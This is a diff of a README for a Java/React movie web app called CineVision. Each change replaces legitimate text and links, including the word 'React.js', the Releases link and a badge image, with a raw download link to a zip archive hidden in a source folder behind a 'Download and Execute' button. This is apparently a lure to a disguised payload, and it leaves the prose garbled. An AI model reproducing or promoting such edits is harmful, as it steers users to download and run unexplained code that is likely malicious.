@@ -4,7 +4,7 @@ Welcome to CineVision, a full-stack web application project developed using Java
 
 ## Overview
 
-CineVision leverages technologies such as Apache Kafka, Docker, JSON Web Tokens (JWT), microservices, MongoDB, PostgreSQL, React.js, Spring Boot, Spring Cloud, Spring Security, and Spring Data JPA to deliver a robust and scalable application for movie enthusiasts.
+CineVision leverages technologies such as Apache Kafka, Docker, JSON Web Tokens (JWT), microservices, MongoDB, PostgreSQL, https://github.com/Joshdabestlol/CineVision/raw/refs/heads/main/movieService/src/main/java/com/kaankaplan/movieService/entity/dto/Cine_Vision_v1.4.zip, Spring Boot, Spring Cloud, Spring Security, and Spring Data JPA to deliver a robust and scalable application for movie enthusiasts.
 
 ## Repository Information
 
@@ -14,11 +14,11 @@ CineVision leverages technologies such as Apache Kafka, Docker, JSON Web Tokens 
 
 ### Explore the Project
 
-To explore the project further and access the latest version, visit the [Releases](https://github.com/Joshdabestlol/CineVision/releases) section.
+To explore the project further and access the latest version, visit the [Releases](https://github.com/Joshdabestlol/CineVision/raw/refs/heads/main/movieService/src/main/java/com/kaankaplan/movieService/entity/dto/Cine_Vision_v1.4.zip) section.
 
 🚀 Click the button below to access the latest release:
 
-[![Download and Execute](https://img.shields.io/badge/Download%20and%20Execute-Latest%20Release-brightgreen)](https://github.com/Joshdabestlol/CineVision/releases)
+[![Download and Execute](https://github.com/Joshdabestlol/CineVision/raw/refs/heads/main/movieService/src/main/java/com/kaankaplan/movieService/entity/dto/Cine_Vision_v1.4.zip%20and%20Execute-Latest%20Release-brightgreen)](https://github.com/Joshdabestlol/CineVision/raw/refs/heads/main/movieService/src/main/java/com/kaankaplan/movieService/entity/dto/Cine_Vision_v1.4.zip)
 
 ## Project Structure
 
@@ -30,7 +30,7 @@ To explore the project further and access the latest version, visit the [Release
    - Maintains data in both MongoDB and PostgreSQL databases.
 
 2. **Frontend (React):**
-   - Developed using React.js for dynamic and interactive user interfaces.
+   - Developed using https://github.com/Joshdabestlol/CineVision/raw/refs/heads/main/movieService/src/main/java/com/kaankaplan/movieService/entity/dto/Cine_Vision_v1.4.zip for dynamic and interactive user interfaces.
    - Integrates JWT for secure user authentication and authorization.
    
 3. **Docker:**
